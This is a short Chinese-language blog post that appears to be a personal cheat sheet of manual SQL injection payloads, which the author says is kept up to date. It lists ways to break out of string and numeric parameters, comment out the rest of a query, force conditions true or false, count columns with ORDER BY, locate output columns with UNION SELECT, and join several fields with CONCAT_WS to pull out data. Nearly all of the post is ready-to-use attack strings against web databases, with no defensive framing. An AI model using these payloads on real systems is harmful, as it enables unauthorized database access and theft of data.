---
layout: post
title: "SQL手工注入语句大全"
author: "Blume"
tags: 网络安全
intro: "持续更新中..."
---

## 说明
此文章持续更新，我会把学到的各种sql注入语句发布在这里

## 语句控制:
- 如果参数是字符串，用 `'`。如果参数是数字，用 `;`

- 要"注释"掉后面的内容，可以用 **`-- `** (有空格!!!)

## 查询语句大全
- 使条件为真: `' or 'a' = 'a`

- 使条件为假: `' and '1' = '0`

- 使用order by判断服务器SQL语句到底查询了多少个参数": `' order by X -- `
  * X 可以是任何一个数字，从比较大的数字开始，一直减半，直到语句成功为止，这时 X 可能就是参数的数量
  * 为了获得更精确的结果，建议在原来的基础上执行多几次加减法

- 确定参数位置: `' union select X,Y,Z...... -- `
  * XYZ看参数数量决定，观察输出以确定参数的位置
  
- 输出多条信息(拼接法): `' union select CONCAT_WS(CHAR(32, 58, 32), X, Y, Z), Y, Z... -- `
  * XYZ看参数数量决定
  * CHAR(32, 58, 32) 指 " : "